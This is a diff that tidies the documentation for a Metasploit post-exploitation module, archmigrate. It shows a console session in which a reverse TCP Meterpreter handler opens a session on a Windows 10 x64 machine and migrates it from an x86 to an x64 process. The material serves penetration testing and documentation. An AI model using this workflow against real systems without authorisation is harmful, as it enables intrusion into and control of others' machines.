@@ -1,5 +1,6 @@
 ## Creating A Testing Environment
-  To use this module you need an x86 executable type meterpreter on a x64 windows machine.
+
+To use this module you need an x86 executable type meterpreter on a x64 windows machine.
 
 This module has been tested against:
 
@@ -23,9 +24,10 @@ This module was not tested against, but may work against:
 
 ### Windows 10 x64
 
+```
     msf exploit(handler) > run
 
-    [*] Started reverse TCP handler on <MSF_IP>:4567 
+    [*] Started reverse TCP handler on <MSF_IP>:4567
     [*] Starting the payload handler...
     [*] Sending stage (957487 bytes) to <Win10x64_IP>
     [*] Meterpreter session 1 opened (<MSF_IP>:4567 -> <Win10x64_IP>:50917) at 2017-03-22 11:43:42 -0500
@@ -39,8 +41,8 @@ This module was not tested against, but may work against:
     Logged On Users : 2
     Meterpreter     : x86/windows
     meterpreter > background
-    [*] Backgrounding session 1...                
-    msf exploit(handler) > use post/windows/manage/archmigrate 
+    [*] Backgrounding session 1...
+    msf exploit(handler) > use post/windows/manage/archmigrate
     msf post(archmigrate) > set session 1
     session => 1
     msf post(archmigrate) > run
@@ -71,3 +73,4 @@ This module was not tested against, but may work against:
     Domain          : WORKGROUP
     Logged On Users : 2
     Meterpreter     : x64/windows
+```
